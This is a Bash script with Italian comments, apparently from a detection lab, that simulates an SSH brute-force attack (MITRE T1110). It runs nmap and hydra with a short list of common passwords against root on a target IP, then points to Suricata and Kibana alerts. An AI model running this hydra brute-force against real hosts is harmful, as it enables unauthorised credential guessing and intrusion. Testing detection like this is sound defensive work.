#!/usr/bin/env bash
# ============================================================
#  Simulazione: T1110 — SSH Brute Force
#  MITRE ATT&CK: Credential Access > Brute Force
#
#  Prerequisiti: hydra, sshpass
#  Target: container DVWA/target nella rete lab (default: localhost)
#
#  SOLO uso didattico in ambiente isolato.
# ============================================================
set -euo pipefail

TARGET="${1:-192.168.56.10}"   # IP target (default: rete lab Vagrant)
PORT="${2:-22}"
WORDLIST="${3:-/usr/share/wordlists/rockyou.txt}"
USER="root"

RED='\033[0;31m'; GRN='\033[0;32m'; YLW='\033[1;33m'; NC='\033[0m'

banner() {
  echo -e "${YLW}"
  echo "╔═══════════════════════════════════════════════╗"
  echo "║  MITRE T1110 — SSH Brute Force Simulation     ║"
  echo "║  Target: $TARGET:$PORT                        ║"
  echo "╚═══════════════════════════════════════════════╝"
  echo -e "${NC}"
}

check_tools() {
  for t in hydra nmap; do
    command -v "$t" >/dev/null 2>&1 || { echo -e "${RED}Manca: $t${NC}"; exit 1; }
  done
}

step() { echo -e "\n${GRN}[►] $*${NC}"; }

banner
check_tools

step "1/4 — Reconnaissance: verifica porta SSH aperta"
nmap -sV -p "$PORT" "$TARGET" --open 2>/dev/null | grep -E "open|ssh|version" || true
sleep 1

step "2/4 — Credential stuffing (prime 20 password comuni)"
# Usa lista ridotta per demo rapida
COMMON_PASS=(
  password 123456 admin root toor qwerty letmein welcome
  monkey dragon master hello shadow sunshine princess
  12345678 password1 iloveyou rockyou
)

TMPLIST=$(mktemp /tmp/passlist.XXXX)
printf '%s\n' "${COMMON_PASS[@]}" > "$TMPLIST"

echo -e "${YLW}Lanciando Hydra contro $TARGET:$PORT (demo lista ridotta)...${NC}"
hydra -l "$USER" -P "$TMPLIST" \
  -t 4 -s "$PORT" \
  -o /tmp/hydra-brute-result.txt \
  ssh://"$TARGET" 2>&1 | tail -20

rm -f "$TMPLIST"

step "3/4 — Log check: verifica alert generati"
echo "Attendo 5s che Suricata/Filebeat processino i log..."
sleep 5
echo "Controlla Kibana → Security → Alerts  (T1110)"
echo "  URL: http://localhost:5601/app/security/alerts"

step "4/4 — Rapporto"
cat <<EOF

  Tecnica simulata : T1110 — Brute Force
  Sub-tecnica      : T1110.001 — Password Guessing
  Tattica MITRE    : Credential Access
  Alert attesi     : Suricata SID 9000001, 9000002
  Log auth         : /var/log/auth.log  (voci "Failed password")

EOF
echo -e "${GRN}Simulazione completata.${NC}"
